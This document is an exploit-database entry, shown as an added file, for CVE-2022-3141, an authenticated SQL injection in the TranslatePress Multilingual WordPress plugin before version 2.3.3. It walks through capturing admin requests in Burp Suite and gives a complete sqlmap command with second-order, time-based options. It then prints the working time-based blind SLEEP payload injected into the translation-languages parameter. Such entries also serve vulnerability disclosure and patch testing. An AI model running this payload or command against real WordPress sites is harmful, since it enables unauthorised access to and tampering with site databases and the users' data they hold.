@@ -1,0 +1,41 @@
+id: 38293
+date: 03/27/2023
+title: WordPress Translatepress Multilinugal plugin < 2.3.3 - Authenticated SQL Injection Vulnerability
+author: Elias Hohl
+cves: CVE-2022-3141
+
+# Exploit Title: Translatepress Multilinugal WordPress plugin < 2.3.3 - Authenticated SQL Injection 
+# Exploit Author: Elias Hohl
+# Vendor Homepage: https://translatepress.com/
+# Software Link: https://wordpress.org/plugins/translatepress-multilingual/
+# Version: < 2.3.3
+# Tested on: Ubuntu 20.04
+# CVE : CVE-2022-3141
+
+Authenticated SQL injection vulnerability in "Translatepress Multilingual" Wordpress plugin
+
+https://medium.com/@elias.hohl/authenticated-sql-injection-vulnerability-in-translatepress-multilingual-wordpress-plugin-effc08eda514
+
+1. Start a new Wordpress instance using docker-compose.
+
+2. Install the translatepress-multilingual plugin. Important note: If there are more than two languages allowed in a kind of premium plan, the exploit might be slightly different. We might need to insert deletion requests between each injection to prevent payloads being executed again. Also note that the en_us_en_gb dictionary table must exist. You might need to add these languages first so the table gets created.
+
+3. Connect your browser to Burp Suite, log in to Wordpress and add any language from the dropdown (the url to do this is /wp-admin/options-general.php?page=translate-press). In Burp Suite, do a right click→ copy to file, and save it as translatepress_req.txt.
+
+4. Go to /sample-page/?trp-edit-translation=preview (a URL to translate an arbitrary post). Again, in Burp Suite do a right mouse click → save to file, and save it as translatepress_req_2.txt.
+
+5. Attack using sqlmap: sqlmap -r translatepress_req.txt -p trp_settings%5Btranslation-languages%5D%5B%5D --dbms=mysql --second-req translatepress_req_2.txt --technique=T --level 5 --risk 3
+
+
+sqlmap will find a time-based blind payload:
+
+
+Parameter: trp_settings[translation-languages][] (POST)
+
+Type: time-based blind
+
+Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+
+Payload: option_page=trp_settings&action=update&_wpnonce=ca410d0e89&_wp_http_referer=/wp-admin/options-general.php?page=translate-press%26settings-updated=true&trp_settings[default-language]=en_US&trp_settings[publish-languages][]=en_US&trp_settings[translation-languages][]=en_US&trp_settings[translation-languages-formality][]=default&trp_settings[url-slugs][en_US]=en_us&trp_settings[translation-languages][]=en_GB WHERE 4372=4372 AND (SELECT 6967 FROM (SELECT(SLEEP(5)))ZDtR)-- bsZU&trp_settings[publish-languages][]=en_GB&trp_settings[translation-languages-formality][]=default&trp_settings[url-slugs][en_GB]=en&trp_settings[native_or_english_name]=english_name&trp_settings[add-subdirectory-to-default-language]=no&trp_settings[force-language-to-custom-links]=yes&trp_settings[shortcode-options]=flags-full-names&trp_settings[menu-options]=flags-full-names&trp_settings[trp-ls-floater]=yes&trp_settings[floater-options]=flags-full-names&trp_settings[floater-color]=dark&trp_settings[floater-position]=bottom-right&trp_email_course_email=
+
+#  0day.today [2023-04-04]  #
